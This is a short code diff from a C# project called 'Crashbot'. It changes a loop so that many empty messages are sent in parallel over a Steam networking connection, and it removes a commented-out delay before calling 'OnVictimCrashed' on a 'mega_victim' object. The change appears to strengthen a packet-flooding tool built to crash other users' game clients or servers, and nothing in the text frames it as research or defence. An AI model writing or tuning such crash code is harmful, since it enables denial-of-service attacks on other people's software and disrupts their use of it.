@@ -227,12 +227,10 @@ namespace Crashbot
 
                 Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token).ContinueWith(_ =>
                 {
-                    for (int i = 0; i < FUN_TIME; i++)
+                    Parallel.For(0, FUN_TIME, (_) =>
                     {
                         this.SteamThread.SendMessageToConnection(conn, [], 0, 0);
-                        
-                        // Task.Delay(20).Wait();
-                    }
+                    });
                     this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
 
                     mega_victim.OnVictimCrashed();
